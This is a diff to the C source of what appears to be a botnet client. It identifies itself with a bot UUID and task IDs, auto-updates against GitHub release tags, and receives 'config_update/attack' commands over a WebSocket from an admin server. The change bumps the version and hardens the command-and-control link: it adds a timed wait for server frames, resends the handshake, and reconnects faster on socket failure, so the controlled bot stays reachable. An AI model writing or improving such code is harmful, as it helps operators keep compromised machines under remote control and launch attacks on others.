@@ -10,7 +10,7 @@ char g_bot_uuid[64] = {0};
 char g_cur_task_id[64] = {0};
 
 /* Must match GitHub release tag style for auto-update compare */
-#define BOT_VERSION_TAG "v4.0.24"
+#define BOT_VERSION_TAG "v4.0.25"
 
 static void sig_handler(int sig) { (void)sig; g_shutdown = 1; }
 
@@ -260,9 +260,50 @@ int main(int argc, char *argv[])
             sleep(cfg.reconnect_min);
             continue;
         }
-        /* Session is live after HS send. Do NOT wait only for handshake_ack —
-         * admin may push config_update/attack before ack (server race). */
-        handshaked = 1;
+
+        /* Wait up to ~8s for any server frame after HS. Resend HS once at 3s.
+         * If CF/Caddy drops the first client frame, resend often recovers. */
+        {
+            int got_ack = 0;
+            int resend = 0;
+            time_t wait_start = time(NULL);
+            while (!g_shutdown && !got_ack && time(NULL) - wait_start < 8) {
+                char abuf[4096];
+                int an = ws_recv(&ws, abuf, sizeof(abuf));
+                if (an > 0) {
+                    last_recv = time(NULL);
+                    char at[64] = {0};
+                    json_str(abuf, "type", at, sizeof(at));
+                    if (foreground)
+                        fprintf(stderr, "[bot] post-hs type=%s len=%d\n", at[0] ? at : "?", an);
+                    /* Any valid server control frame means the link is live */
+                    if (at[0]) {
+                        got_ack = 1;
+                        handshaked = 1;
+                        break;
+                    }
+                    continue;
+                }
+                if (an < 0) {
+                    if (foreground) fprintf(stderr, "[bot] post-hs hard error errno=%d\n", errno);
+                    break;
+                }
+                if (!resend && time(NULL) - wait_start >= 3) {
+                    int wr2 = ws_send(&ws, hs);
+                    resend = 1;
+                    if (foreground) fprintf(stderr, "[bot] handshake resend wr=%d\n", wr2);
+                    if (wr2 <= 0) break;
+                }
+            }
+            if (!got_ack) {
+                if (foreground) fprintf(stderr, "[bot] no handshake_ack, reconnect\n");
+                ws_disconnect(&ws);
+                pthread_mutex_destroy(&ws.io);
+                sleep(cfg.reconnect_min);
+                continue;
+            }
+        }
+
         if (foreground) fprintf(stderr, "[bot] session ready (main loop)\n");
 
         while (!g_shutdown)
@@ -308,12 +349,8 @@ int main(int argc, char *argv[])
             }
             if (n < 0) {
                 recv_fail++;
-                if (foreground) fprintf(stderr, "[bot] recv hard error #%d\n", recv_fail);
-                /* CF/Caddy flaky closes: only reconnect after several hard fails */
-                if (recv_fail < 5) {
-                    usleep(200000);
-                    continue;
-                }
+                if (foreground) fprintf(stderr, "[bot] recv hard error #%d errno=%d\n", recv_fail, errno);
+                /* Socket is dead — do not spin 5 times on a closed FD */
                 break;
             }
             last_recv = time(NULL);
